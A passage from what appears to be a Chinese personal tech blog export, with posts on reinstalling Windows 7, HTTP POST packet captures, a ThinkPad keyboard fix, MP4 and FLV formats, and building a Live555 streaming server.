    <url>/%E9%9A%8F%E7%AC%94/%E8%AE%B0%E4%B8%80%E6%AC%A1U%E7%9B%98%E5%AE%89%E8%A3%85%E5%8E%9F%E7%89%88Windows7%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>2014年买的老笔记本想要重装系统，老硬件不想装Win10，用U盘装了个<code>微PE</code>安装了原版sp1，装完之后，硬盘原本挺好的四个分区盘符全乱了，一般的盘符可以修改过来，但系统盘变成了<code>D盘</code>，改不过来。</p>
<p>于是想再次重装，顺便对硬盘重新分一下区，分两个区就足够。</p>
<h2 id="Ghost"><a href="#Ghost" class="headerlink" title="Ghost"></a>Ghost</h2><p>由于Ghost比较方便，首选用它来重装，首先想到的是以前有用过的 <code>老毛桃PE</code>，用U盘烧了个PE，ghost文件也放在U盘，不过不太好使了，里面的分区工具也是不好使，分完区不能用。所以也无法在PE下安装系统。</p>
<p>由于这次分区不能用，只能又回到原版安装了。</p>
<h2 id="原版"><a href="#原版" class="headerlink" title="原版"></a>原版</h2><h3 id="一、-工具"><a href="#一、-工具" class="headerlink" title="一、 工具"></a>一、 工具</h3><ol>
<li>U盘</li>
<li>一台被重装系统的笔记本</li>
<li>一台完好的笔记本，协助</li>
<li><code>cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso</code></li>
<li>NT6 HDD Installer（系统引导软件）</li>
</ol>
<h3 id="二、准备工作"><a href="#二、准备工作" class="headerlink" title="二、准备工作"></a>二、准备工作</h3><ol>
<li>PE是运行在内存中，所以我拔掉了U盘，不影响PE的运行。</li>
<li>格式化掉U盘中的PE。</li>
<li>将 <code>cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso</code> 解压到U盘根目录。</li>
<li>将磁盘引导启动软件HHD也拷贝到U盘</li>
</ol>
<h3 id="三、开始安装"><a href="#三、开始安装" class="headerlink" title="三、开始安装"></a>三、开始安装</h3><ol>
<li>U盘重新插到重装的笔记本，PE能读到U盘。</li>
<li>运行HHD，按照提示安装引导程序。</li>
<li>确认笔记本的BIOS设置启动项是U盘优先。</li>
<li>重启，启动引导-选择进入HHD。</li>
<li>Windows7的安装界面，这里往下，基本和CD/DVD安装差不多了。</li>
<li>利用Windows7的分区工具重新分区（两个区），格式化。</li>
<li>系统安装目标为C盘。</li>
<li>进入”Windows安装程序”，执行一些“复制文件”和“准备要安装的文件”等操作。</li>
<li>完成之后重启，拔出U盘。</li>
<li>进入Windows安装和设置，基本OK了。</li>
</ol>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>深入解析HTTP--POST请求</title>
    <url>/%E5%89%8D%E7%AB%AF/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90HTTP--POST%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>之前写的《深入解析HTTP–Chunk分块发送》 和 《深入解析HTTP–Multipart》 都是关于用POST请求上传文件，本文要讲的，是指POST请求传递字符数据。</p>
<p>我们用PostMan作为客户端，SpringBoot作为服务端，Wireshark抓包，分析一下每个请求的包结构，了解一下其中的区别。</p>
<h2 id="一、最简单的传参"><a href="#一、最简单的传参" class="headerlink" title="一、最简单的传参"></a>一、最简单的传参</h2><p>服务端代码：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/post"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">testpost</span><span class="params">(@RequestParam(<span class="string">"name"</span>)</span> String name)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">"ok:"</span>+name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>postman上有两种方式可以完成这个请求：</p>
<ol>
<li><p>URL中带参数<br><img src="/images/前端/post_url.png" alt><br>这样的请求就相当于GET请求了，从下面的请求抓包也可以看出，基本和GET请求一样，要注意的是参数如果有中文等则需要编码。<br><strong> 网络抓包 </strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /post?name=kevin HTTP/1.1</span><br><span class="line">Host: 192.168.0.223:8080</span><br><span class="line">content-length: 0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 8</span><br><span class="line">Date: Sat, 20 Jul 2019 04:37:55 GMT</span><br><span class="line"></span><br><span class="line">ok:kevin</span><br></pre></td></tr></table></figure>
</li>
<li><p>Body中带参数(application/x-www-form-urlencoded)<br>客户端要在Header加 <code>Content-Type: application/x-www-form-urlencoded</code><br><img src="/images/前端/post_x-www-form-urlencoded.png" alt><br><strong> 网络抓包 </strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /post HTTP/1.1</span><br><span class="line">Host: 192.168.0.223:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">content-length: 9</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">name=evalHTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Date: Sat, 20 Jul 2019 04:39:53 GMT</span><br><span class="line"></span><br><span class="line">ok:eval</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>注意：请求体的Body之后没有换行符（/r/n），所以抓包的响应体<code>HTTP/1.1 200</code>没有换行</p>
</blockquote>
<p>个人觉得，POST的数据就应该放在Body里面，如本例子，本例子Body体的参数带有中文也是没有问题的。</p>
<h2 id="二、发送文本"><a href="#二、发送文本" class="headerlink" title="二、发送文本"></a>二、发送文本</h2><p>服务端代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/post/txt"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">testPostText</span><span class="params">(@RequestBody()</span> String body)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">"body:"</span>+body);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>客户端发送文本要在Header加 <code>Content-Type: text/plain</code></p>
<p>请求<br><img src="/images/前端/post_text_1.png" alt><br>响应<br><img src="/images/前端/post_text_2.png" alt></p>
<p><strong> 网络抓包 </strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /post/txt HTTP/1.1</span><br><span class="line">Host: 192.168.0.223:8080</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">content-length: 6</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">......HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 11</span><br><span class="line">Date: Sat, 20 Jul 2019 08:59:44 GMT</span><br><span class="line"></span><br><span class="line">body:......</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>......</code>是中文字符 “你好”</p>
</blockquote>
<h2 id="三、发送JSON"><a href="#三、发送JSON" class="headerlink" title="三、发送JSON"></a>三、发送JSON</h2><p>服务端代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/post/json"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">testPostText</span><span class="params">(@RequestBody()</span> Object object)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>客户端发送JSON要在Header加 <code>Content-Type: application/json</code></p>
<p>请求<br><img src="/images/前端/post_json_1.png" alt><br>响应<br><img src="/images/前端/post_json_2.png" alt></p>
<p><strong> 网络抓包 </strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /post/json HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Host: 192.168.0.223:8080</span><br><span class="line">content-length: 29</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;json&quot;, &quot;age&quot;:&quot;222&quot;&#125;HTTP/1.1 200 </span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Date: Sat, 20 Jul 2019 09:24:02 GMT</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;json&quot;,&quot;age&quot;:&quot;222&quot;&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>记一次笔记本键盘失灵故障修复</title>
    <url>/%E9%9A%8F%E7%AC%94/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AC%94%E8%AE%B0%E6%9C%AC%E9%94%AE%E7%9B%98%E5%A4%B1%E7%81%B5%E6%95%85%E9%9A%9C%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h2 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h2><p>一台 <code>Thinkpad E431</code> （装的Win7系统）半年没开过机，拿出来时，开机停留在“Windows启动管理器”，不会自动进入系统，并且 <code>Enter</code> 键失效了，无法进入系统。</p>
<p>后来通过乱按左边的键才能进一次系统，在系统里发现 <code>Backspace</code> 和 <code>Shift</code> 键也失效了(可以下载 <code>键盘检测</code> 软件来检查)。</p>
<p>初步怀疑是放置时间太久导致COMS没电，主板的一些配置信息丢失了。<code>F1</code> 进去看了一遍BIOS，没找到什么改的，而且 <code>Enter</code> 失效，通过外接键盘才能改BIOS信息。</p>
<h2 id="意外解决问题"><a href="#意外解决问题" class="headerlink" title="意外解决问题"></a>意外解决问题</h2><p>有了外接键盘，尝试了 <code>最后一次正确配置</code> 和 <code>安全模式</code> 都不行。</p>
<p>失望之际，拔掉外接键盘还给朋友， <code>安全模式</code> 下在NotePad++内乱按了一下键盘，结果突然 <code>Enter</code> 和 <code>Backspace</code> 就能用了（一脸懵逼）。</p>
<h2 id="修改-Fn-和-Ctrl-的位置"><a href="#修改-Fn-和-Ctrl-的位置" class="headerlink" title="修改 Fn 和 Ctrl 的位置"></a>修改 Fn 和 Ctrl 的位置</h2><p>在BIOS中，可以通过设置来切换这两个键的功能。</p>
<p>使用了 <code>ThinkPad</code> 笔记本都知道，键盘左下角的 <code>Ctrl</code>键被 <code>Fn</code> 替代了，然后 <code>Ctrl</code> 移到了 <code>左下2</code> 的位置，这一设计，非常反人类，让人很不习惯，如图：</p>
<p><img src="/images/随笔/键盘-Thinkpad.jpg" alt></p>
<p>而一般电脑是键盘是这样的：</p>
<p><img src="/images/随笔/键盘-Lenovo.jpg" alt></p>
<p>如何在键盘 <code>Ctrl</code> 和 <code>Fn</code> 本身位置不变的情况下，互换这两个按键的实际功能，也就是按下<code>Fn</code>实际相当于按下 <code>Ctrl</code> ?</p>
<p><img src="/images/随笔/Thinkpad-BIOS-0.jpg" alt><br><img src="/images/随笔/Thinkpad-BIOS-1.jpg" alt></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>Android 操作Mp4文件库</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/Android%20%E6%93%8D%E4%BD%9CMp4%E6%96%87%E4%BB%B6%E5%BA%93/</url>
    <content><![CDATA[<h3 id="1-文件操作"><a href="#1-文件操作" class="headerlink" title="1. 文件操作"></a>1. 文件操作</h3><p><a href="https://github.com/sannies/mp4parser" target="_blank" rel="noopener">【mp4parser】</a> 这个库提供了用于读取、写入和创建MP4文件的Java API，包含三个组件：</p>
<ol>
<li>isoparser</li>
<li>muxer</li>
<li>streaming</li>
</ol>
<p>我用了muxer，将H264文件和AAC文件合并为MP4文件。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mp4parser/muxer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mp4parser<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>muxer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.41<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">H264TrackImpl h264Track = <span class="keyword">new</span> H264TrackImpl(<span class="keyword">new</span> FileDataSourceImpl(h264Path));</span><br><span class="line">AACTrackImpl aacTrack = <span class="keyword">new</span> AACTrackImpl(<span class="keyword">new</span> FileDataSourceImpl(aacPath));</span><br><span class="line">Movie movie = <span class="keyword">new</span> Movie();</span><br><span class="line">movie.addTrack(h264Track);</span><br><span class="line">movie.addTrack(aacTrack);</span><br><span class="line">Container mp4file = <span class="keyword">new</span> DefaultMp4Builder().build(movie);</span><br><span class="line"></span><br><span class="line">FileChannel fc = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(outPath)).getChannel();</span><br><span class="line">mp4file.writeContainer(fc);</span><br><span class="line">fc.close();</span><br></pre></td></tr></table></figure>
<h3 id="2-流式合并"><a href="#2-流式合并" class="headerlink" title="2. 流式合并"></a>2. 流式合并</h3><ul>
<li><p><a href="http://developer.android.com/reference/android/media/MediaMuxer.html" target="_blank" rel="noopener">【MediaMuxer】</a> </p>
<p>Android 4.3 提供的一套用于将视频（H.264、H.263）和音频（AAC、ARM-NB、ARM-WB）合成的为mp4格式的一套简单好用的API</p>
</li>
<li><p>C++开源库 <a href="https://github.com/TechSmith/mp4v2" target="_blank" rel="noopener">【mp4v2】</a> ，网上多数人用的是<a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mp4v2/mp4v2-2.0.0.tar.bz2" target="_blank" rel="noopener">【2.0.0版本】</a></p>
<p>mp4v2为操作mp4文件提供了一套强大的API。mp4v2提供了一套基于<code>ISO/IEC 14496-1:2001</code>标准的mp4格式文件的创建和修改的API，这个媒体容器被广泛的使用，具有很好的兼容性。</p>
<p>不过对于我们Android开发来说有点麻烦，还需要自己做NDK编译和二次封装。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
      <tags>
        <tag>mp4,mp4parser</tag>
      </tags>
  </entry>
  <entry>
    <title>FLV封装格式解析</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/FLV%E5%B0%81%E8%A3%85%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。<br>本文链接：<a href="https://blog.csdn.net/houxiaoni01/article/details/78832414" target="_blank" rel="noopener">https://blog.csdn.net/houxiaoni01/article/details/78832414</a> </p>
<p>FLV（Flash Video）是Adobe公司设计开发的一种流行的流媒体格式，由于其视频文件体积轻巧、封装简单等特点，使其很适合在互联网上进行应用。此外，FLV可以使用Flash Player进行播放，而Flash Player插件已经安装在全世界绝大部分浏览器上，这使得通过网页播放FLV视频十分容易。目前主流的视频网站如优酷网，土豆网，乐视网等网站无一例外地使用了FLV格式。FLV封装格式的文件后缀通常为“.flv”。<br>　　总体上看，FLV包括文件头（File Header）和文件体（File Body）两部分，其中文件体由一系列的Tag组成。因此一个FLV文件是如图1-1结构。</p>
<table>
<thead>
<tr>
<th>头文件</th>
<th>Tag#1</th>
<th>Tag#2</th>
<th>Tag#3</th>
<th>…</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>　　 　　　　　　　　　　　　　　　　　图1-1 文件结构（简图）</p>
<p>　　其中，每个Tag前面还包含了Previous Tag Size字段，表示前面一个Tag的大小。Tag的类型可以是视频、音频和Script，每个Tag只能包含以上三种类型的数据中的一种。图1-2展示了FLV文件的详细结构。</p>
<p><img src="/images/音视频/FLV1.jpg" alt="这里写图片描述"></p>
<p>　　下面详细介绍一下三种Tag的Tag Data部分的结构。<br> 　　(a) Audio Tag Data结构（音频Tag）<br> 　　音频Tag开始的第1个字节包含了音频数据的参数信息，从第2个字节开始为音频流数据。结构如图1-3所示。<br> <img src="/images/音视频/FLV2.png" alt="这里写图片描述"><br> 　　第1个字节的前4位的数值表示了音频编码类型。如表1-1所示。</p>
<p>　　　　　表1-1.音频编码类型</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Linear PCM，platform endian</td>
</tr>
<tr>
<td>1</td>
<td>ADPCM</td>
</tr>
<tr>
<td>2</td>
<td>MP3</td>
</tr>
<tr>
<td>3</td>
<td>Linear PCM，little endian</td>
</tr>
<tr>
<td>4</td>
<td>Nellymoser 16-kHz mono</td>
</tr>
<tr>
<td>5</td>
<td>Nellymoser 8-kHz mono</td>
</tr>
<tr>
<td>6</td>
<td>Nellymoser</td>
</tr>
<tr>
<td>7</td>
<td>G.711 A-law logarithmic PCM</td>
</tr>
<tr>
<td>8</td>
<td>G.711 mu-law logarithmic PCM</td>
</tr>
<tr>
<td>9</td>
<td>reserved</td>
</tr>
<tr>
<td>10</td>
<td>AAC</td>
</tr>
<tr>
<td>14</td>
<td>MP3 8-Khz</td>
</tr>
<tr>
<td>15</td>
<td>Device-specific sound</td>
</tr>
</tbody>
</table>
<p>第1个字节的第5-6位的数值表示音频采样率。如表1-2所示。</p>
<p>表1-2.音频采样率</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>5.5kHz</td>
</tr>
<tr>
<td>1</td>
<td>11KHz</td>
</tr>
<tr>
<td>2</td>
<td>22 kHz</td>
</tr>
<tr>
<td>3</td>
<td>44 kHz</td>
</tr>
</tbody>
</table>
<p>PS：从上表可以发现，FLV封装格式并不支持48KHz的采样率。<br> 第1个字节的第7位表示音频采样精度。如表1-3所示。</p>
<p>表1-3.音频采样精度</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>8bits</td>
</tr>
<tr>
<td>1</td>
<td>16bits</td>
</tr>
</tbody>
</table>
<p>第1个字节的第8位表示音频类型。</p>
<p>　表1-4. 音频类型</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>sndMono</td>
</tr>
<tr>
<td>1</td>
<td>sndStereo</td>
</tr>
</tbody>
</table>
<p>　　(b) Video Tag Data结构（视频Tag）<br> 　　视频Tag也用开始的第1个字节包含视频数据的参数信息，从第2个字节为视频流数据。结构如图1-4所示。</p>
<p><img src="/images/音视频/FLV3.jpg" alt="这里写图片描述"></p>
<p>第1个字节的前4位的数值表示帧类型。如表1-5所示。</p>
<p>　　　　　　　　　　　表1-5.帧类型</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>keyframe （for AVC，a seekable frame）</td>
</tr>
<tr>
<td>2</td>
<td>inter frame （for AVC，a nonseekable frame）</td>
</tr>
<tr>
<td>3</td>
<td>disposable inter frame （H.263 only）</td>
</tr>
<tr>
<td>4</td>
<td>generated keyframe （reserved for server use）</td>
</tr>
<tr>
<td>5</td>
<td>video info/command frame</td>
</tr>
</tbody>
</table>
<p>第1个字节的后4位的数值表示视频编码类型。如表1-6所示。</p>
<p>表1-6.视频编码类型</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>JPEG （currently unused）</td>
</tr>
<tr>
<td>2</td>
<td>Sorenson H.263</td>
</tr>
<tr>
<td>3</td>
<td>Screen video</td>
</tr>
<tr>
<td>4</td>
<td>On2 VP6</td>
</tr>
<tr>
<td>5</td>
<td>On2 VP6 with alpha channel</td>
</tr>
<tr>
<td>6</td>
<td>Screen video version 2</td>
</tr>
<tr>
<td>7</td>
<td>AVC</td>
</tr>
</tbody>
</table>
<p>(c) Script Tag Data结构（控制帧）<br> 　　该类型Tag又通常被称为Metadata Tag，会放一些关于FLV视频和音频的元数据信息如：duration、width、height等。通常该类型Tag会跟在File Header后面作为第一个Tag出现，而且只有一个。结构如图1-5所示。</p>
<table>
<thead>
<tr>
<th>AMF1（“onMetaData”）</th>
<th>AMF2（“width,height…”）</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>　　　　　　　　　　图1-5.Script Tag Data结构</p>
<p>　　第一个AMF包：<br>  　第1个字节表示AMF包类型，一般总是0x02，表示字符串。第2-3个字节为UI16类型值，标识字符串的长度，一般总是0x000A（“onMetaData”长度）。后面字节为具体的字符串，一般总为“onMetaData”（6F,6E,4D,65,74,61,44,61,74,61）。<br> 　　第二个AMF包：<br> 　　第1个字节表示AMF包类型，一般总是0x08，表示数组。第2-5个字节为UI32类型值，表示数组元素的个数。后面即为各数组元素的封装，数组元素为元素名称和值组成的对。常见的数组元素如表1-7所示。</p>
<p>　　　　表1-7.常见MetaData</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>duration</td>
<td>时长</td>
</tr>
<tr>
<td>width</td>
<td>视频宽度</td>
</tr>
<tr>
<td>height</td>
<td>视频高度</td>
</tr>
<tr>
<td>videodatarate</td>
<td>视频码率</td>
</tr>
<tr>
<td>framerate</td>
<td>视频帧率</td>
</tr>
<tr>
<td>videocodecid</td>
<td>视频编码方式</td>
</tr>
<tr>
<td>audiosamplerate</td>
<td>音频采样率</td>
</tr>
<tr>
<td>audiosamplesize</td>
<td>音频采样精度</td>
</tr>
<tr>
<td>stereo</td>
<td>是否为立体声</td>
</tr>
<tr>
<td>audiocodecid</td>
<td>音频编码方式</td>
</tr>
<tr>
<td>filesize</td>
<td>文件大小</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
      <tags>
        <tag>flv</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP边下边播MP4文件</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/HTTP%E8%BE%B9%E4%B8%8B%E8%BE%B9%E6%92%ADMP4%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="通过HTTP无法播放MP4视频？"><a href="#通过HTTP无法播放MP4视频？" class="headerlink" title="通过HTTP无法播放MP4视频？"></a>通过HTTP无法播放MP4视频？</h2><p>有一个摄像机录制的视频文件record.mp4 ，放在web服务器上边下边播（<code>http://mydomain.com/record.mp4</code> ），发现无法播放，下载到本地可以播放。<br>但是从抖音下载的视频douyin.mp4文件，同样放在web服务器上，可以边下边播（<code>http://mydomain.com/douyin.mp4</code> ）能正常播放。</p>
<p>都是MP4封装格式 ，这两个文件有什么不同呢？</p>
<p>通过 <code>Mp4Explorer</code> 这个软件，可以查看MP4的详细信息。</p>
<blockquote>
<p>moov 是box参数列表，可以粗暴理解为 <strong>配置信息</strong><br>mdata 是音视频数据</p>
</blockquote>
<p><strong>1. record.mp4</strong><br><img src="/images/音视频/MP4-录像.png" alt="录像"><br><strong>2. douyin.mp4</strong><br><img src="/images/音视频/MP4-抖音.png" alt="抖音"></p>
<p>通过上图可知道：<br>record.mp4 的数据顺序是 <strong>mdata + moov</strong><br>douyin.mp4 的数据顺序是 <strong>moov + mdata</strong></p>
<p>大多数录制的MP4工具，都会将moov放在文件尾部，播放器播放MP4视频要首先解析moov中的box参数进行初始化，然后才能对mdata里面的音视频数据进行音视频同步播放。<br>在本地播放，播放器会去文件尾部读取moov，不会影响播放，但是通过网络（HTTP）播放就会有问题，播放器读取不到moov就会报错。<br>这就是为什么两个文件都可以本地播放，而网络播放有一个不可以播放。</p>
<h2 id="解决网络播放问题"><a href="#解决网络播放问题" class="headerlink" title="解决网络播放问题"></a>解决网络播放问题</h2><ol>
<li><p>moov提前（推荐）<br>将moov信息提取到文件头部，播放器可以首先读取到moov数据，出图快，一劳永逸。<br>那如何提前？<br> ①.  ffmpeg -i record.mp4 -c copy -f mp4 -movflags faststart  output.mp4 (ffmpeg 大小20 ~ 30M)<br> ②.（<strong>推荐</strong>）单独编译 ffmpeg 项目中 faststart.c 文件 （大概20KB），<a href="https://github.com/FFmpeg/FFmpeg/blob/master/tools/qt-faststart.c" target="_blank" rel="noopener">【faststart.c源码】</a></p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：Ubuntu下gcc编译 qt-faststart.c</span></span><br><span class="line">$ vim qt-faststart.c   <span class="comment">#拷贝源码</span></span><br><span class="line">$ gcc qt-faststart.c -o qt-faststart</span><br><span class="line">$ qt-faststart input.mp4 output.mp4</span><br><span class="line">ftyp          0 28</span><br><span class="line">mdat         28 771862</span><br><span class="line">moov     771890 2050</span><br><span class="line"> patching stco atom...</span><br><span class="line"> patching stco atom...</span><br><span class="line"> writing ftyp atom...</span><br><span class="line"> writing moov atom...</span><br><span class="line"> copying rest of file...</span><br></pre></td></tr></table></figure>
</li>
<li><p>Web服务器支持断点下载<br>断点下载，即请求时携带Header<code>RANGE: bytes=-</code> ，这不仅需要服务器支持断点，播放器也要支持，播放器首先请求moov信息，再请求mdata，这也是一种方法，但比较麻烦，出图也慢。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>Live555搭建流媒体服务器</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/Live555%E6%90%AD%E5%BB%BA%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>Live555提供HTTP/RTSP协议的多媒体流服务器和RTSP流代理中转。</p>
<h2 id="下载源码编译"><a href="#下载源码编译" class="headerlink" title="下载源码编译"></a>下载源码编译</h2><p>需要g++编译环境<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget  http://www.live555.com/liveMedia/public/live555-latest.tar.gz</span><br><span class="line">$ tar -xzvf live555-latest.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> live</span><br><span class="line">$ ls</span><br><span class="line">BasicUsageEnvironment       config.iphoneos                     config.solaris-32bit     liveMedia</span><br><span class="line">config.armeb-uclibc         config.iphone-simulator             config.solaris-64bit     Makefile.head</span><br><span class="line">config.armlinux             config.linux                        config.uClinux           Makefile.tail</span><br><span class="line">config.avr32-linux          config.linux-64bit                  configure                mediaServer</span><br><span class="line">config.bfin-linux-uclibc    config.linux-gdb                    COPYING                  proxyServer</span><br><span class="line">config.bfin-uclinux         config.linux-no-openssl             COPYING.LESSER           README</span><br><span class="line">config.bsplinux             config.linux-with-shared-libraries  fix-makefile             testProgs</span><br><span class="line">config.cris-axis-linux-gnu  config.macosx                       genMakefiles             UsageEnvironment</span><br><span class="line">config.cygwin               config.macosx-no-openssl            genWindowsMakefiles      win32config</span><br><span class="line">config.cygwin-for-vlc       config.mingw                        genWindowsMakefiles.cmd  win32config.Borland</span><br><span class="line">config.freebsd              config.openbsd                      groupsock                WindowsAudioInputDevice</span><br><span class="line">config.freebsd-no-openssl   config.qnx4                         hlsProxy</span><br><span class="line">$ ./genMakefiles linux-64bit <span class="comment">#linux-64bit这个参数是config.&lt;后缀&gt;获取得到的，是编译的目标平台</span></span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>编译成功，在 <code>mediaServer</code> 和 <code>proxyServer</code> 目录里面有可执行文件</p>
<h3 id="1-mediaServer"><a href="#1-mediaServer" class="headerlink" title="1.mediaServer"></a>1.mediaServer</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mediaServer</span><br><span class="line">$ ./live555MediaServer</span><br><span class="line">LIVE555 Media Server</span><br><span class="line">	version 1.00 (LIVE555 Streaming Media library version 2020.06.25).</span><br><span class="line">Play streams from this server using the URL</span><br><span class="line">	rtsp://192.168.0.223:8554/&lt;filename&gt;</span><br><span class="line"><span class="built_in">where</span> &lt;filename&gt; is a file present <span class="keyword">in</span> the current directory.</span><br><span class="line">Each file<span class="string">'s type is inferred from its name suffix:</span></span><br><span class="line"><span class="string">	".264" =&gt; a H.264 Video Elementary Stream file</span></span><br><span class="line"><span class="string">	".265" =&gt; a H.265 Video Elementary Stream file</span></span><br><span class="line"><span class="string">	".aac" =&gt; an AAC Audio (ADTS format) file</span></span><br><span class="line"><span class="string">	".ac3" =&gt; an AC-3 Audio file</span></span><br><span class="line"><span class="string">	".amr" =&gt; an AMR Audio file</span></span><br><span class="line"><span class="string">	".dv" =&gt; a DV Video file</span></span><br><span class="line"><span class="string">	".m4e" =&gt; a MPEG-4 Video Elementary Stream file</span></span><br><span class="line"><span class="string">	".mkv" =&gt; a Matroska audio+video+(optional)subtitles file</span></span><br><span class="line"><span class="string">	".mp3" =&gt; a MPEG-1 or 2 Audio file</span></span><br><span class="line"><span class="string">	".mpg" =&gt; a MPEG-1 or 2 Program Stream (audio+video) file</span></span><br><span class="line"><span class="string">	".ogg" or ".ogv" or ".opus" =&gt; an Ogg audio and/or video file</span></span><br><span class="line"><span class="string">	".ts" =&gt; a MPEG Transport Stream file</span></span><br><span class="line"><span class="string">		(a ".tsx" index file - if present - provides server '</span>trick play<span class="string">' 